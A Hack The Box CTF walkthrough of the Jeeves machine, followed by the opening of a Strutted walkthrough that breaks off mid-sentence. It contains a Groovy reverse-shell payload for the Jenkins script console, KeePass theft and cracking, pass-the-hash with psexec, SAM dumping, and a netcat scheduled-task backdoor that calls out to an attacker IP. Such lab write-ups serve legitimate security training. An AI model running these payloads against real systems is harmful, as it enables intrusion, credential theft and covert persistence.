        "content": "Jeeves Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Jeeves How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: TCP:\n#Command nmap $box -Pn -oA TCPbasicScan #Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 06:51 BST Nmap scan report for 10.129.184.134 Host is up (0.040s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds 50000/tcp open ibm-db2 Initial thoughts: We have web, rpc, SMB \u0026amp; and ibm-db2 instance also. UDP:\n#Command sudo nmap $box -sU -Pn -oA UDPbasicScan #Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 09:06 BST Nmap scan report for 10.129.184.134 Host is up. All 1000 scanned ports on 10.129.184.134 are in ignored states. Not shown: 1000 open|filtered udp ports (no-response) Nmap done: 1 IP address (1 host up) scanned in 214.46 seconds Initial thoughts: No ports open. Comprehensive Scans: #Command sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP #Results [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 06:52 BST Nmap scan report for 10.129.184.134 Host is up (0.022s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Ask Jeeves 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 50000/tcp open http Jetty 9.4.z-SNAPSHOT |_http-server-header: Jetty(9.4.z-SNAPSHOT) |_http-title: Error 404 Not Found Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 11 (86%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2025-06-12T10:55:42 |_ start_date: 2025-06-12T10:41:07 |_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 217.34 seconds Findings: First we hit SMB \u0026amp; web then 5000. Interesting note, there is the service jetty 9.4.z-SNAPSHOT SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold:\nnetexec smb $box -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares netexec smb $box -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares Both are disabled. +Note+: We can see the build number is 10586 We can now enumerate that. Web 80: WhatWeb: Lets run WhatWeb to see if I can glean some further information.\n#Command whatweb http://$box | sed \u0026#39;s/, /\\n/g\u0026#39; #Output http://10.129.184.134 [200 OK] Country[RESERVED][ZZ] HTML5 HTTPServer[Microsoft-IIS/10.0] IP[10.129.184.134] Microsoft-IIS[10.0] Title[Ask Jeeves] Results: It looks like it\u0026rsquo;s running a self hosted version of Ask Jeeves. +Note+: I use sed to display the output across multiple lines for easier readability. Dirbusting The Webserver Running Using FFUF: We can perform some directory busting to see if there are any interesting directories.\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ -fs [ignoreSize] -ic There are none other than index.html\nFile Enumeration Using FFUF: We can perform some file busting to see if there are any interesting files with the extension we have found.\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ.html -ic There are none other than index.html \u0026amp; error.html TODO Subdomain Enumeration with FFUF: Let\u0026rsquo;s enumerate any possible subdomains with ffuf.\nffuf -w /home/kali/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt:FUZZ -u http://$box -H \u0026#34;Host:FUZZ.$box\u0026#34; -fs 230 -ic Enumerating Injection Points With Burpsuite: Web Enumeration via Burp Suite: When manually enumerating a Website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Discovering the Host is running MSSQL 2005: Navigating to the home page we can see it\u0026rsquo;s running Ask Jeeves as expected. If we run a search we get the following response, where we can see it\u0026rsquo;s running MSSQL 2005 - 9.00.4053.00 What\u0026rsquo;s strange is that this is just a PNG file and that we are not getting a standard error Looking at the source code it seems it will only return the error.html page too. Looking further at the request on the page we can see that no actual argument is being passed in the GET request. Discovering An Open Jenkins instance running: Let\u0026rsquo;s dirbust the ibm-db2 service.\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box:50000/FUZZ -ic There is one hit for askjeeves that is a redirect. Let\u0026rsquo;s Whatweb the url and see what we get http://10.129.184.134:5000/askjeeves whatweb http://$box:50000/askjeeves | sed \u0026#39;s/, /\\n/g\u0026#39; As we can see it redirects to a jenkins instance, version 2.87. Navigating to the address allows us to access the instance without providing credentials Side Quest: What is Jenkins? Jenkins is an open-source automation server that\u0026rsquo;s widely used in the software development lifecycle, particularly for CI/CD (Continuous Integration and Continuous Delivery). It\u0026rsquo;s used by developers to automatically build, test, and deploy code so they don’t have to. Jenkins uses pipelines, which are typically written in a scripting language called Groovy (kinda like if Bash \u0026amp; Java and were pushed together).\nThe cool, albeit dangerous thing is these pipelines can execute code, which makes Jenkins incredibly powerful… and potentially a great attack surface when misconfigured for us.\n2. Foothold: Getting RCE via Jenkins: As a POC let\u0026rsquo;s see if we can get RCE on the host and have Jenkins ping our attack host.\nJenkins RCE Option 1: Creating a New Jenkins Job: Creating A New Jenkins Job: Select \u0026ldquo;New Item\u0026rdquo;. Select \u0026ldquo;Freestyle Project\u0026rdquo; \u0026amp; give the project a name \u0026amp; click \u0026ldquo;OK\u0026rdquo; Under the \u0026ldquo;Build\u0026rdquo; heading click \u0026ldquo;Execute Windows Batch Command\u0026rdquo; +Note+: If this was a Linux instance we would select \u0026ldquo;Execute Shell\u0026rdquo;\nIn the \u0026ldquo;Command\u0026rdquo; box we will put in a simple ping command to ping our host\nping 10.10.14.16 Now click \u0026ldquo;Save\u0026rdquo; at the bottom of the page Using TCPDUMP To Listen for Ping Traffic: We will use TCPDUMP on our attack host to listen for ping traffic\nsudo tcpdump -n -i tun0 icmp Executing The Jenkins Job: We now select \u0026ldquo;Build Now\u0026rdquo; in jenkins and this will trigger the build pipeline. As we can see we now see we have RCE on the host as the pings hit our listener.\nJenkins RCE Option 2: Using the Scripting Console: We can also use the jenkins scripting console by navigating to -\nhttp://10.129.228.112:50000/askjeeves/script As this is a Windows Install we will use the below syntax to execute code\n# Anything we put here will be run, below is just an example. def cmd = \u0026#34;cmd.exe /c ping 10.10.14.16\u0026#34;.execute(); println(\u0026#34;${cmd.text}\u0026#34;); As you can see after we click \u0026ldquo;Run\u0026rdquo; it executes and we get output as the \u0026ldquo;Result\u0026rdquo; Let\u0026rsquo;s take a quick look and see what users are present on the system.\n#When running command with trailing backslashes we need to escape them using double slashes def cmd = [\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, \u0026#34;dir\u0026#34;, \u0026#34;C:\\\\Users\\\\\u0026#34;].execute() println(\u0026#34;${cmd.text}\u0026#34;); Jenkins Linux Scripting Console Syntax: Note if jenkins is running on Linux the syntax is slightly different when running commands in the script console.\n# Anything we put here will be run, below is just an example. def cmd = \u0026#39;ls -la /root/.ssh\u0026#39; def sout = new StringBuffer(), serr = new StringBuffer() def proc = cmd.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println sout Using The Jenkins Scripting Console To Get A Reverse Shell: As we have RCE on the host we can use the jenkins scripting console to get a reverse shell.\nString host=\u0026#34;10.10.14.16\u0026#34;; int port=53; String cmd=\u0026#34;cmd.exe\u0026#34;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u0026gt;0)so.write(pi.read());while(pe.available()\u0026gt;0)so.write(pe.read());while(si.available()\u0026gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); We setup a listener:\nrlwrap -cAr nc -nvlp 53 Then hit \u0026ldquo;run\u0026rdquo; +Note+: There is also a metasploit module that can be used for this.\nuse exploit/multi/http/jenkins_script_console Checking config.xml: In most jenkins instances we can find hashed passwords in the config.xml file, located in the root of the install. However in this case there does not appear to be any.\nFinding The Initial Jenkins Admin Password: If we navigate to the secrets folder we can also find the initial jenkins admin password, this is generated on install by jenkins. +Note+: This is purely for jenkins only, however we will take a copy of it for documentation purposes.\nDiscovering Admin Password Hash in Jenkins config.xml: If we navigate to users\\admin we will find a file called config.xml checking this file we can see it contains a password hash for the jenkins admin user. As we can see this is actually a bcrypt encrypted password.\nThere is also an API token at the top of the page we will take a note of also as this could be useful later on. Attempting To Crack The encrypted hash: I did try and crack with hashcat but it did not crack \u0026amp; it should be noted that cracking bcrypt hashes can be a slow process.\nhashcat -m 3200 jenkins.hash -w ~/Wordlists/rockyou.txt Checking Our Users Permissions \u0026amp; groups: Let\u0026rsquo;s enumerate what user we are running as and what groups \u0026amp; privileges they have.\nwhoami \u0026amp;\u0026amp; whoami /priv \u0026amp;\u0026amp; whoami /groups We can see we are running as the user kohsuke \u0026amp; that they have the SeImpersonatePrivilege. Usually this would be a slam dunk in regards to privesc as we could use the PrintSpoofer or Potato Exploits to privesc, however I have tried these and I cannot get them to work as expected.\nThe user is not part of any interesting groups.\nLets get our flag. 3. Privilege Escalation: Finding A KeePass Archive Enumerating As kohsuke: Enumerating as kohsuke we can see they have a keepass database in their documents folder. We may be able to extract crack this and retrieve passwords lets transfer it back to our host. We are going to encode the file using base64 and then copy the string to our host and decode it back into the file.\nTo do this we are going to use a nested powershell commands as there are certain things we can only do with powershell (as the tools that would enable us to perform the tasks with CMD are not present. We also use nested commands as this shell doesn\u0026rsquo;t play nice if we try and switch directly to powershell.\n1. Generating A MD5 hash Of The Object: We will generate an MD5 hash so we can ensure that the transfer did not alter the contents.\npowershell -command \u0026#34;Get-FileHash -Path \u0026#39;C:\\Users\\kohsuke\\Documents\\CEH.kdbx\u0026#39; -Algorithm MD5 | Select Hash\u0026#34; As we see we get the value 519237656FDECAD4B9A5C82F40AADDEB\nGenerating A Hash With certutil: We can also generate an MD5 from CMD by using certutil. However in this case it is not installed on the host, below is the command that could be used if the binary was present.\n#Command certutil -hashfile \u0026lt;filepath\u0026gt; \u0026lt;hashingAlgorithm\u0026gt; #Example certutil -hashfile C:\\Users\\kohsuke\\Documents\\CEH.kdbx MD5 +Note+: Without certutil there is no native way to generate a hash from cmd, this is why are we using powershell.\n2. Base64 Encode The KeePass Database For Transfer: Now lets base64 encode the object so we get a base64 string we can decode.\npowershell -command \u0026#34;[Convert]::ToBase64String((Get-Content -Path \u0026#39;C:\\Users\\kohsuke\\Documents\\CEH.kdbx\u0026#39; -Encoding Byte))\u0026#34; 3. Decoding The Base64 Encoded String Back Into the KeePass Database: Now we have our base64 encoded string, lets decode it to re-create the original object.\necho 17mKUs3QryFwc96ihtoDruiozHAD0LLWW7b7TqkP[SNIPPET]PDubQASwjZ01U7MxXi+Zg3KwSv5e2yOjvcw=\u0026#34; | base64 -d \u0026gt;\u0026gt; CEH.kdbx 4. Comparing The Hashes To Ensure Transfer Was Successful: First we will generate a hash on our linux host of the decoded object.\nmd5sum CEH.kdbx Now we will check the hashes match to ensure these is no corruption.\nbash -c \u0026#39;str1=\u0026#34;519237656FDECAD4B9A5C82F40AADDEB\u0026#34;; str2=\u0026#34;519237656fdecad4b9a5c82f40aaddeb\u0026#34;; [ \u0026#34;${str1,,}\u0026#34; = \u0026#34;${str2,,}\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;Same\u0026#34; || echo \u0026#34;Different\u0026#34;\u0026#39; +Note+: I am using a bash subshell as I use ZSH and this will throw an error otherwise.\nSo we can see they match, but as it\u0026rsquo;s a KDBX file we will need the key to open it. Let\u0026rsquo;s see if we can crack it.\nCracking The KeePass Archive With keepass2john \u0026amp; John: We can use the tool keepass2john to create a hash of the archive and then we can attempt to crack that hash.\nkeepass2john CEH.kdbx \u0026gt;\u0026gt; keepass.hash Now we have our hash let\u0026rsquo;s try and crack it.\nUsually I prefer hashcat but as we have already used one John tool, why not use John today.\njohn --wordlist=~/Wordlists/rockyou.txt keepass.hash It cracks!\nAnd we now have our password moonshine1 lets see if we can open the archive.\nReading the passwords From The KeePass Database: If you don\u0026rsquo;t have KeePass installed, it can be installed easily with the below command.\nsudo apt update \u0026amp;\u0026amp; sudo apt install keepassxc +Note+: This is the xc variant, which I just prefer to use.\nLets open the database. Enter the password. And we are in.\nLooking at the entries if we check the entry marked Backup Stuff we can see it contains a hash. Trying this against the domain with netexec and a list of users we can see it is the administrator hash.\nnetexec smb $box -u Users.txt -H \u0026#34;e0fb1fb85756c24235ff238cbe81fe00\u0026#34; --shares --continue-on-success We can then get a shell using impacket-psexec:\nimpacket-psexec $user@$box -hashes :$hash Now we get our flag….or can we…. This is interesting. Initially I try and find the flag using the where command but cannot find it.\nwhere /R C:\\ root.txt CTF Shenanigans After Lots Of Searching….. So after lots of searching the OS and looking at different parts of the OS I couldn\u0026rsquo;t find the flag so had to look for a hint.\nI found that the box creator had used \u0026ldquo;alternative data streams\u0026rdquo; to hide the flag. I\u0026rsquo;ve never seen or heard of this happening in the wild so not bothered by looking at a hint as it seems very CTF like and not realistic.\nWe can read the flag with the below command.\npowershell Get-Content -Path \u0026#34;hm.txt\u0026#34; -Stream \u0026#34;root.txt\u0026#34; As this was the first time I had come across this, I wanted to learn a bit more about ADS, so decided to make side-quest.\nSide Quest: What\u0026rsquo;s an alternative data stream (ADS)? Alternate Data Streams are a feature of NTFS, the file-system used by Windows. It allows us to hide data within an existing file without changing the file\u0026rsquo;s main contents or size in a noticeable way.\nIt\u0026rsquo;s kind of like a hidden compartment in a suitcase. The main file contents are the obvious items inside. The Alternate Data Stream is like a hidden compartment inside the suitcase, it doesn\u0026rsquo;t show up in normal views but it’s still there and can be found if you know how to look for it.\nIn this case the creator of the box used an ADS on the hm.txt file.\nDiscovering ADS Alternative Data Streams: We can view ADS in directories by using the dir command with the /R flag. This lists all files in the directory including any alternate data streams as well.\ndir /R This tells us that hm.txt has an alternate stream called root.txt.\nReading the ADS with Powershell: To read the contents of the root.txt stream hidden in hm.txt, we can use:\nGet-Content -Path \u0026#34;hm.txt\u0026#34; -Stream \u0026#34;root.txt\u0026#34; That command tells Powershell, look at the file hm.txt, but instead of reading the default content, read the alternate stream named root.txt.\n4. Persistence: Dumping SAM DB with impacket-secretsdump: We can use impacket-secretsdump to dump any entry\u0026rsquo;s in the SAM file and extract the hashes.\nimpacket-secretsdump $domain/$user@$box -hashes :$hash Scheduled Task Back-door: We can make a scheduled task to reconnect back to our host every 1 minute as a means of persistence.\nschtasks /create /tn BackDoor /tr \u0026#34;C:\\Users\\Administrator\\Documents\\nc64.exe 10.10.14.28 53 -e cmd\u0026#34; /sc minute /mo 1 /ru Administrator Command Breakdown:\n/sc minute: Specifies that the task should run every minute. /mo 1: Runs the task every 1 minute. /ru Administrator: Runs the task with System privileges. /tr: Specifies the action to execute, in this case, running nc64.exe with the specified options. +Note+: This techniques runs every 1 minute and calls out to my attack machine. This means that even if I disconnect I can turn on my listener again and it will call back out to me.\nShell Caught. Just to double check I disconnect to ensure it calls back out to my host another two times. Lessons Learned: What did I learn? I am already pretty comfortable with jenkins so that was fine. I did learn about ADS, but I am yet to find a use other than metadata, as it seems like a security risk? https://blog.netwrix.com/2022/12/16/alternate_data_stream/ This also felt like an easy box and not a medium box. What silly mistakes did I make? Not too many this time so that was nice, must be getting enough sleep. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n",

        "content": "Strutted Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Strutted How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan:\n#Command nmap $box -Pn -oA TCPbasicScan #Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-24 06:52 BST Nmap scan report for 10.129.7.241 Host is up (0.023s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Initial thoughts: SSH \u0026amp; Web so let\u0026rsquo;s get started on web. Comprehensive Scans: In depth scan TCP:\n#Command sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP #Results Nmap scan report for strutted.htb (10.129.7.241) Host is up (0.024s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Strutted\\xE2\\x84\\xA2 - Instant Image Uploads Device type: general purpose|router Running: Linux 5.X, MikroTik RouterOS 7.X OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 40.26 seconds Findings: Some minor additional information but not enought to pull us in a different direction. We can see the main site is running an \u0026ldquo;Instant Image Uploads\u0026rdquo; site but that\u0026rsquo;s it. Web 80: WhatWeb: Lets run WhatWeb to see if I can glean some further information.\n#Command whatweb http://$box | sed \u0026#39;s/, /\\n/g\u0026#39; #Output http://10.129.7.241 [302 Found] Country[RESERVED][ZZ] HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)] IP[10.129.7.241] RedirectLocation[http://strutted.htb/] Title[302 Found] nginx[1.18.0] ERROR Opening: http://strutted.htb/ - no address for strutted.htb As we can see it auto redirects to strutted.htb but as we don\u0026rsquo;t have this in our /etc/hosts it will not redirect properly. Let\u0026rsquo;s add this to our hosts file and redo.\nsudo echo \u0026#34;$box strutted.htb\u0026#34; | sudo tee -a /etc/hosts http://10.129.7.241 [302 Found] Country[RESERVED][ZZ] HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)] IP[10.129.7.241] RedirectLocation[http://strutted.htb/] Title[302 Found] nginx[1.18.0] http://strutted.htb/ [200 OK] Bootstrap Content-Language[en-US] Cookies[JSESSIONID] Country[RESERVED][ZZ] HTML5 HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)] HttpOnly[JSESSIONID] IP[10.129.7.241] Java Script Title[Strutted™ - Instant Image Uploads] UncommonHeaders[cross-origin-embedder-policy-report-only,cross-origin-opener-policy] nginx[1.18.0] Results: nginx 1.18.1 Ubuntu It\u0026rsquo;s running java and a scripting language. +Note+: I use sed to display the output across multiple lines for easier readability. Dirbusting The Webserver Running Using FFUF: We can perform some directory busting to see if there are any interesting directories:\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$domain/FUZZ -fs 5197 -ic Only the listed pages were found:\nabout [Status: 200, Size: 6610, Words: 2173, Lines: 182, Duration: 391ms] download [Status: 200, Size: 39680602, Words: 0, Lines: 0, Duration: 0ms] how [Status: 200, Size: 6119, Words: 2054, Lines: 182, Duration: 417ms] Subdomain Enumeration with FFUF: Let\u0026rsquo;s enumerate any possible subdomains with ffuf.\nffuf -w /home/kali/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt:FUZZ -u http://$domain -H \u0026#34;Host:FUZZ.$domain\u0026#34; -ic -fs 5197 Enumerating Injection Points With Burpsuite: Web Enumeration via Burp Suite: When manually enumerating a Website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Checking the main page: We can see it\u0026rsquo;s the image upload app however at the bottom it tells us if we click the \u0026ldquo;Download\u0026rdquo; button we can access the docker image and source code. 2. Reading Application Source Code: After downloading the source code we can unzip it with unzip strutted.zip. There is a lot of stuff in here \u0026amp; I am going to go on a few side-quests in order to provide a general understanding of the technologies being used, this is to ensure you actually understanding what is going on and not just how to PWN.\nDiscovering Hardcoded Tomcat creds the source code: If we check the tomcat-users.xml file in the root directory we can see it contains hard-coded admin credentials. We can see these should work on the endpoints:\nmanager-gui \u0026amp; admin-gui Now tomcat does not appear to be running on an external facing port, so it may be hosted internally which is common, let\u0026rsquo;s put a pin in these and keep moving.\nSide Quest: What is Apache Tomcat? Tomcat is a java based HTTP application server. In English that means it\u0026rsquo;s a web server that can be used to serve applications that are written in the java programming language.\nThe core component of Tomcat is Catalina, this acts as the servlet container. Whenever we want to start Tomcat we actually start Catalina which in turn starts Tomcat which deploys the web applications.\nIf you were to download the Tomcat source code and cd\u0026rsquo;d into the bin folder two of the scripts you would find are catalina.sh \u0026amp; catalina.bat.\ncatalina.sh/catalina.bat: Is the primary control script for Tomcat for starting Apache Tomcat.\n+Note+: This may seem superfluous, but this is requisite knowledge for something that is coming up so please be patient.\nReading the README.md Looking at the README we can see that the application typically operates over port 8080 \u0026amp; is containerized using Docker. You may be thinking \u0026ldquo;We are accessing on the webserver over port 80 though?\u0026rdquo; That is correct however docker containers will often have presets of unprivileged ports e.g. ports \u0026gt; 1024 as defaults and then put behind a reverse proxy. Or the internal port of 8080 will be mapped to the external port of 80.\nThe rest of the README just details basic functionality, however it does also provide an email address support@strutted.htb.\nReading the Dockerfile: Having a Dockerfile is great as we can actually see how the company run\u0026rsquo;s the application.\nI\u0026rsquo;m going to give a little Dockerfile \u0026amp; build primer if you are not familiar with how docker builds work etc, I would recommend you read the below, however if you do skip ahead to the examining portion.\nSide Quest: What\u0026rsquo;s a Dockerfile? A Dockerfile is a configuration file used by Docker to declare the steps needed to build a Docker image. It\u0026rsquo;s essentially a recipe: it tells Docker what to do, step by step. For example, if we want to install a package like ffmpeg, we can include a command like apt install ffmpeg in the Dockerfile.\nWe can do almost anything we would do on a standard Linux machine like copy files, create users, delete files, etc. However, we do it declaratively. That means we write down the instructions in the Dockerfile, and Docker systematically goes through them to build the final image. Once it\u0026rsquo;s done, we get a portable, reusable Docker image that we can run anywhere.\nMulti-Stage Builds:\nA note on multi-stage builds : we can use something called multi-stage builds. This technique is often used to reduce the size of the final Docker image.\nHere\u0026rsquo;s how it works: dependencies are pulled in and used during a build stage, and once the application or binary is built, only the necessary output (e.g. the built binary) is copied into the final runtime stage. This means all the build-time dependencies can be excluded from the final image—resulting in a smaller, cleaner, and more efficient container.\nExamination of the Dockerfile Build Stage: As this is a multistage build we can break this down into the two stages so we can get a better understanding of what is happening with the creation of the image.\nFROM --platform=linux/amd64 openjdk:17-jdk-alpine #FROM openjdk:17-jdk-alpine RUN apk add --no-cache maven COPY strutted /tmp/strutted WORKDIR /tmp/strutted RUN mvn clean package FROM --platform=linux/amd64 openjdk:17-jdk-alpine The linux amd64 platform is selected to run the alpine image with contains the java version 17. So this is what is being used as the base of the image.\nRUN apk add --no-cache maven The alpine package manager apk is being used to install the maven binary. I will explain soon what maven is, however just for the moment, understand that maven is an orchestration tool used to manage, package and build primarily java applications.\nCOPY strutted /tmp/strutted The strutted folder is then copied into the container at the location /tmp/strutted. This contains all the java, jsp files and pom.xml etc.\nWORKDIR /tmp/strutted The working drive is then set to /tmp/strutted this is just the equivalent of using cd to move into that drive.\nRUN mvn clean package The command mvn clean package is run, which will tell maven to pull all the dependencies listed in the pom.xml, again this will be explained further soon, and then go through the package process which will build the artifact (it\u0026rsquo;s kind of like a binary but not) (strutted-1.0.0.war) as outlined in the pom.xml.\nSummary: In this stage the source code that is contained in the strutted folder in the root directory of this download folder is copied into the docker image and compiled using maven so that it generates a file called strutted-1.0.0.war\nExamination Of The Dockerfile Run Stage: This section is primarily focused on copying, moving \u0026amp; deleting files as well as starting the program.\nFROM tomcat:9.0 RUN rm -rf /usr/local/tomcat/webapps/ RUN mv /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/ RUN rm -rf /usr/local/tomcat/webapps/ROOT COPY ./tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml COPY ./context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml EXPOSE 8080 CMD [\u0026#34;catalina.sh\u0026#34;, \u0026#34;run\u0026#34;] FROM tomcat:9.0\nThe tomcat 9.0 image is selected as a base image. This makes sense as it\u0026rsquo;s a java based HTTP server and the application that was compiled in the previous step is also java. We also learn what version of tomcat is being used. RUN rm -rf /usr/local/tomcat/webapps/\nThe folder /user/local/tomcat/webapps/ is deleted. RUN mv /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/\nThe file webapps.dist is then moved to the folder webapps in the same directory. RUN rm -rf /usr/local/tomcat/webapps/ROOT\nThe ROOT folder is deleted in the webapps folder. COPY --from=0 /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war\nThe strutted-1.0.0.war file that was generated in the first part of the build is then copied into the /usr/local/tomcat/webapps file and then renamed ROOT.war. COPY ./tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml\nThe ./tomcat-users.xml file which we saw contains hard coded creds is then copied into the container to be used at run time, naughty naughty. COPY ./context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml\nThe context.xml file is then copied into the container to /usr/local/tomcat/webapps/manager/META-INF/context.xml EXPOSE 8080\nThe image then exposes port 8080 so it can be accessed. CMD [\u0026quot;catalina.sh\u0026quot;, \u0026quot;run\u0026quot;]\nThis is the default command that will be run when the image is run as a container, catalina.sh will be run which then in turn launches Tomcat itself. Summary: In this stage we can see that all of the dependencies from the previous stage are deleted and that the strutted-1.0.0.war that was generated in the build stage is copied in. The tomcat server is configured, using hard coded creds, the service is exposed on port 8080 and then the server is launched.\nSide Quest: What is Maven? I know, I know, another side quest. But really, it\u0026rsquo;s important to understand what Maven is. As you saw it was used in the build stage of the Dockerfile to generate a .war file. That\u0026rsquo;s because it\u0026rsquo;s being used to manage, package, and build this application. So without at least a basic knowledge of Maven, where to find things and the terminology it uses, this next part won\u0026rsquo;t make much sense.\nMaven provides a standardized way to structure projects, for example, all Maven projects follow the same standardized \u0026amp; enforced folder layout.\nmy-maven-project/ ├── pom.xml # The Maven configuration file (Project Object Model) ├── src/ │ ├── main/ │ │ ├── java/ # Your application source code (.java files) │ │ └── resources/ # Non-code resources (config files, etc.) │ └── test/ │ ├── java/ # Unit and integration test code │ └── resources/ # Test-specific resources └── target/ # Generated output (compiled classes, JARs, etc.) All Maven projects are managed by a file called pom.xml. This is the core configuration file, it defines the project\u0026rsquo;s dependencies, build goals, and the type of output file (artifact) to generate.\nIn Maven, when you compile a project, the resulting file is called an artifact. The name of this artifact is set in the pom.xml using the \u0026lt;artifactId\u0026gt; tag. So when you see me say artifact, just think \u0026ldquo;the file that got built.\u0026rdquo;\n+Note+: The reason I am explaining this is if you understand that ALL Maven projects are structured the same if you come across one again in the future, which you will as it\u0026rsquo;s a widely adopted tool by Java developers \u0026amp; ALOT of applications are written in java, you will know where to look for key information.\nNow that you understand this the next parts will make more 